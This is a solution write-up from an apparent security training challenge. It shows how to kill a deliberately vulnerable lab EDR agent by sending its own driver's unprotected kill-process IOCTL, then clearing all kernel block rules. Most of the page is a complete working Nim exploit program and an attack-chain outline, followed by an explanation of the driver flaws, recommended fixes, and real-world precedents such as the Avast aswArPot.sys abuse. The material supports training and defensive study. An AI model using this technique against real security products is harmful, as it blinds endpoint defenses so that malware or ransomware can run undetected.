---
title: "Solution 40: IOCTL Hijack — Kill via EDR's Own Driver"
difficulty: medium
category: "IOCTL Abuse"
---

[Back to Challenge]({{ '/challenges/40-ioctl-hijack-kill/' | relative_url }})

## Overview

The MostShittyEDR driver's device (`\\.\MostShittyEDR`) has zero access control — any process can open it and invoke all IOCTLs, including `IOCTL_KILL_PROCESS` which calls `ZwTerminateProcess` from ring 0. This turns the EDR's own driver into a BYOVD weapon without needing any external vulnerable driver.

## Solution

```nim
# ioctl_hijack.nim - kill the EDR agent using its own driver
import winim/lean

const
  DEVICE_PATH        = r"\\.\MostShittyEDR"
  IOCTL_KILL_PROCESS = 0x222004'u32
  IOCTL_CLEAR_RULES  = 0x22200C'u32

type
  EdrCommand {.packed.} = object
    action: uint32
    processId: uint64

proc findPid(name: string): DWORD =
  let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  if snap == INVALID_HANDLE_VALUE: return 0
  defer: CloseHandle(snap)

  var pe: PROCESSENTRY32
  pe.dwSize = DWORD(sizeof(PROCESSENTRY32))
  if Process32First(snap, &pe) != 0:
    while true:
      let exe = $cast[cstring](addr pe.szExeFile[0])
      if exe.toLowerAscii() == name.toLowerAscii():
        return pe.th32ProcessID
      if Process32Next(snap, &pe) == 0: break
  return 0

when isMainModule:
  # Step 1: Open the EDR's own device — no admin required
  let hDevice = CreateFileA(DEVICE_PATH,
    GENERIC_READ or GENERIC_WRITE,
    0, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)

  if hDevice == INVALID_HANDLE_VALUE:
    echo "[-] Cannot open device (driver not loaded?)"
    quit(1)
  defer: CloseHandle(hDevice)
  echo "[+] Opened \\\\.\\ MostShittyEDR device"

  # Step 2: Find the agent PID
  let pid = findPid("edr_agent.exe")
  if pid == 0:
    echo "[-] edr_agent.exe not found"
    quit(1)
  echo "[+] Agent PID: ", pid

  # Step 3: Kill the agent via its own driver's IOCTL
  var cmd = EdrCommand(action: 1, processId: uint64(pid))
  var bytesReturned: DWORD
  let ok = DeviceIoControl(hDevice, IOCTL_KILL_PROCESS,
    &cmd, DWORD(sizeof(cmd)), nil, 0, &bytesReturned, nil)

  if ok != 0:
    echo "[+] Agent killed via its own driver's ZwTerminateProcess"
  else:
    echo "[-] Kill IOCTL failed: ", GetLastError()
    quit(1)

  # Step 4: Clear all block rules so malware can run freely
  discard DeviceIoControl(hDevice, IOCTL_CLEAR_RULES,
    nil, 0, nil, 0, &bytesReturned, nil)
  echo "[+] All kernel block rules cleared"
  echo "[+] EDR is dead, protections removed — operate freely"
```

## Why It Works

The vulnerability chain is:

1. **`IoCreateDevice` with no security descriptor** ([driver.cpp:882-884](../../src/driver/driver.cpp)): The device inherits the default DACL, which allows local users to open it.

2. **`DispatchCreateClose` always succeeds** ([driver.cpp:762-769](../../src/driver/driver.cpp)): No process identity check, no integrity level check, no signature validation.

3. **`FILE_ANY_ACCESS` on all IOCTLs** ([driver.cpp:59-72](../../src/driver/driver.cpp)): Even a handle opened with only `GENERIC_READ` can send destructive IOCTLs.

4. **`HandleKillProcess` validates only `Action == 1`** ([driver.cpp:567](../../src/driver/driver.cpp)): No check whether the target PID is the agent, a system process, or if the caller is authorized.

A production EDR would fix this with:
- A restrictive DACL on the device object (only the agent's SID)
- Caller verification via `IoGetRequestorProcessId` or PID binding on `IRP_MJ_CREATE`
- `FILE_WRITE_ACCESS` on destructive IOCTLs
- PID whitelist preventing self-kill

## Attack Chain

```
1. CreateFileA("\\.\MostShittyEDR") — succeeds without admin
2. Find edr_agent.exe PID via Toolhelp32
3. DeviceIoControl(IOCTL_KILL_PROCESS, {Action=1, PID=target})
4. Agent is dead — ZwTerminateProcess from ring 0
5. DeviceIoControl(IOCTL_CLEAR_BLOCK_RULES) — remove all protections
6. Operate freely — callbacks still fire but nobody reads them
```

## Real-World Comparison

This is the same class of vulnerability that made real EDR drivers exploitable in the wild:
- **Avast aswArPot.sys** — exposed a kill-process IOCTL that the Avos Locker ransomware abused
- **Zemana AntiMalware** — `zam64.sys` exposed similar unprotected IOCTLs

Modern EDRs protect against this by running their agent as PPL and restricting device access to the agent's exact process signature.

## How to Verify

1. Start the EDR: `.\edr_agent.exe --driver --verbose`
2. In another terminal, compile and run: `nim c -r ioctl_hijack.nim`
3. The agent disappears — verify with `tasklist /fi "imagename eq edr_agent.exe"`
4. The driver is still loaded but orphaned — events are enqueued with nobody to read them
